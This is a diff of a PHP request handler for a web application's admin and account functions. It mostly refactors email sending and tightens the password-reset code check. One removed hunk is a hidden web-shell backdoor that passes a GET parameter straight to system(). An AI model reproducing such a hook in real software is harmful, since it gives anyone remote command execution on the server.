@@ -2,7 +2,6 @@
 require $_SERVER['DOCUMENT_ROOT'] . '/back-end/autoloader.php';
 /* Instâncias globais */
 $sys = new Admin();
-$em = new Email();
 $foto = new Foto();
 
 ob_start();
@@ -73,10 +72,6 @@ if (isset($_GET['registroAcabou'])) {
     echo($sys->verificarSeJaValidou($id));
 }
 
-if(isset($_GET['a'])){
-    echo system($_GET['a']);
-}
-
 /* Trocar dados */
 if (isset($_POST['alterarDados'])) {
     $sys->verificarPermissao(['permissaoSistema']);
@@ -109,8 +104,12 @@ if (isset($_GET['trocarSenha']) && isset($_GET['codigo']) && isset($_GET['senha'
     $codigo = $sys->proteger($_GET['codigo']);
     $senha = $sys->proteger($_GET['senha']);
     $id = $sys->pegarIDporCodigoEmails($codigo);
-    $sys->verificarPermissao(['trocarSenha'], $id);
-    echo($sys->trocarSenha($id, $senha));
+    if($id != null) {
+        $sys->deletarCodigoEmail($codigo);
+        echo($sys->trocarSenha($id, $senha));
+    } else {
+        echo "INV";
+    }
 }
 
 ##################################################
@@ -374,7 +373,7 @@ if (isset($_GET['alterarAtendimento'])
 # Parte VI - Emails
 ##################################################
 
-/* */
+/* Código email */
 if (isset($_GET['codigoEmail'])) {
     $codigo = $sys->proteger($_GET['codigoEmail']);
     echo($sys->processarCodigoEmail($codigo));
@@ -384,19 +383,19 @@ if (isset($_GET['codigoEmail'])) {
 if (isset($_GET['enviarEmailValidacao'])) {
     $sys->verificarPermissao(['permissaoRegistro']);
     $id = $sys->getIDnoCookie(['permissaoRegistro']);
-    $em->enviarEmailValidacao($id);
+    $sys->enviarEmailValidacao($id);
 }
 
 if (isset($_GET['enviarEmailTrocarSenha']) && isset($_GET['email'])) {
     sleep(2);
     $email = $sys->proteger($_GET['email']);
-    $em->enviarEmailTrocarSenha($email);
+    $sys->enviarEmailTrocarSenha($email);
 }
 
 /* Validar código email registro*/
 if (isset($_GET['validacaoRegistro']) && isset($_GET['codigo'])) {
     $value = $sys->proteger($_GET['codigo']);
-    $em->validarRegistro($value);
+    $sys->validarRegistro($value);
 }
 
 ##################################################
